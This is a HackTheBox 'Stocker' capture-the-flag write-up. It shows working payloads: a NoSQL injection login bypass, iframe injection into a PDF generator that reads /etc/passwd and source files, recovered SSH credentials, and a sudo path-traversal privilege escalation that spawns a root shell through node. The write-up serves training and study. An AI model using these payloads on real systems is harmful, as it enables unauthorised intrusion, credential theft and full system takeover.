# HackTheBox -Stocker

Initial Nmap 1000 tcp port scan
```bash
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```
I did a full tcp port scan their is nothing open rather than our initial scan

## Hosts
stocker.htb

## Subdomain
dev.stocker.htb
We can login the site but we dont have an option to register.

## Tech stack
Backend is using express framework so that is an nodejs server.Mostly Nodejs is come with MEAN stack

Trying to bypass the login with NoInjection.

Payload
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```
we can sucessfully bypass the login

# Foothold as user

Pdf xss to arbitary file Read.

Backend is using headless chrome to pdf printing. version identified using exiftool from one of the pdf.
chrome 108.
Inject an iframe in title parameter to read the local file using file schemea.

Payload
Reading passwd file
"<iframe src=file:///etc/passwd width=\"1000\" height=\"1000\"></iframe>"
Reading source file index.js
"<iframe src=file:///var/www/dev/index.js width=\"1000\" height=\"1000\"></iframe>"
Once read the username from passwd file we get the password from index.js to take ssh

Creds
angoose:IHeardPassphrasesArePrettySecure

# Privilege Escalation
```bash
We can run sudo with nodejs and some js scripts
User angoose may run the following commands on stocker:                                                  
    (ALL) /usr/bin/node /usr/local/scripts/*.js  
```
Abuse this with path travesel we can run our js script with sudo.

payload shell.js
```javascript
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
```
Rooted!
